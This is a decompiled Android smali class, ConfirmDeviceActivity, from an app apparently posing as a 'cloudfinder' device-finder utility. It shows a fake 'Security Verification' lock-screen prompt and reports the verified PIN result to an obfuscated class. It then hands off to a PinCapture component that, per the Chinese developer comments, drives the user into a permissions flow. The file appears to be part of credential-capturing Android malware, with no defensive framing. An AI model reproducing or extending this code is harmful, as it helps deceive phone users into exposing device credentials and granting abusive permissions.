.class public Lcom/lite/cloudfinder/activity/ConfirmDeviceActivity;
.super Landroid/app/Activity;
.source "SourceFile"


# static fields
.field public static final synthetic ؋:I


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public final onActivityResult(IILandroid/content/Intent;)V
    .locals 2

    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onActivityResult(IILandroid/content/Intent;)V

    const/16 p3, 0x3e9

    if-ne p1, p3, :cond_1

    const/4 p1, -0x1

    const-string p3, "ConfirmDevice"

    if-ne p2, p1, :cond_0

    const-string p1, "PIN verified CORRECT"

    invoke-static {p3, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :try_start_0
    const-string p1, "pin_verify"

    const-string p2, "PIN_CONFIRMED_CORRECT"

    invoke-static {p1, p2}, Lڝږ؁ڋ/ر;->؋(Ljava/lang/String;Ljava/lang/String;)V

    # 2.2：验证成功 → 进入权限流程
    invoke-static {p0}, Lcom/lite/cloudfinder/pin/PinCapture;->onVerified(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    const/4 p1, 0x0

    invoke-virtual {p0, p1, p1}, Landroid/app/Activity;->overridePendingTransition(II)V

    goto :goto_0

    :cond_0
    const-string p1, "PIN verify cancelled -> permissions"

    invoke-static {p3, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    # 2.2：取消/锁屏不再纠缠，直接进入权限流程
    invoke-static {p0}, Lcom/lite/cloudfinder/pin/PinCapture;->onAborted(Landroid/content/Context;)V

    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    :cond_1
    :goto_0
    return-void
.end method

.method public final onBackPressed()V
    .locals 0

    # 2.2：按返回 = 放弃输入，立即进入权限流程（不再死等）
    invoke-static {p0}, Lcom/lite/cloudfinder/pin/PinCapture;->onAborted(Landroid/content/Context;)V

    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    return-void
.end method

.method public final onCreate(Landroid/os/Bundle;)V
    .locals 3

    const-string v0, "ConfirmDevice"

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    :try_start_0
    const-string p1, "keyguard"

    invoke-virtual {p0, p1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/app/KeyguardManager;

    if-nez p1, :cond_0

    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    return-void

    :cond_0
    const-string v1, "Security Verification"

    const-string v2, "For your account safety, please verify your identity"

    invoke-virtual {p1, v1, v2}, Landroid/app/KeyguardManager;->createConfirmDeviceCredentialIntent(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Landroid/content/Intent;

    move-result-object p1

    if-eqz p1, :cond_1

    const/16 v1, 0x3e9

    invoke-virtual {p0, p1, v1}, Landroid/app/Activity;->startActivityForResult(Landroid/content/Intent;I)V

    goto :goto_0

    :cond_1
    const-string p1, "No lock screen set, skip"

    invoke-static {v0, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {p0}, Landroid/app/Activity;->finish()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    const-string v1, "onCreate error"

    invoke-static {v0, v1, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    :goto_0
    return-void
.end method
